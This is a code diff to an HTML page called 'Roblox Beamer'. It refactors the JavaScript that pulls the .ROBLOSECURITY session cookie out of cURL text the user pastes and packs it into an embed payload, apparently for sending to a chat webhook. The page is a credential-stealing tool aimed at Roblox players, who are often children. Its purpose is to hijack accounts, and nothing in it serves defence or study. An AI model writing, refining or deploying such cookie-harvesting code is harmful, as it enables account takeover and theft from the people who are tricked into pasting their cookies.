@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TESTRoblox Beamer</title>
+  <title>Roblox Beamer</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -66,15 +66,10 @@
 
       errorMessage.textContent = ""; // Clear any previous error messages
 
-      // Regular expression to match the ROBLOSECURITY cookie or token
-      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+)(?=;|$)/;
+      // Extract the _ROBLOSECURITY token from the copied cURL data
+      const robloSecurityCode = extractRobloSecurityToken(message);
 
-      const match = message.match(robloSecurityCodeRegex);
-
-      if (match && match[1]) {
-        // Extract the Roblox security token
-        const robloSecurityCode = match[1];
-
+      if (robloSecurityCode) {
         // Create the embed payload with only the _ROBLOSECURITY code
         const embedPayload = {
           embeds: [
@@ -110,6 +105,18 @@
       } else {
         // If the _ROBLOSECURITY cookie is not found in the message
         errorMessage.textContent = "Message failed! .ROBLOSECURITY cookie not found.";
+      }
+    }
+
+    function extractRobloSecurityToken(curlText) {
+      // Regular expression to extract _ROBLOSECURITY token from cURL format
+      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+)(?=\s|$)/;
+      const match = curlText.match(robloSecurityCodeRegex);
+
+      if (match && match[1]) {
+        return match[1]; // Return the token if found
+      } else {
+        return null; // Return null if the token is not found
       }
     }
 
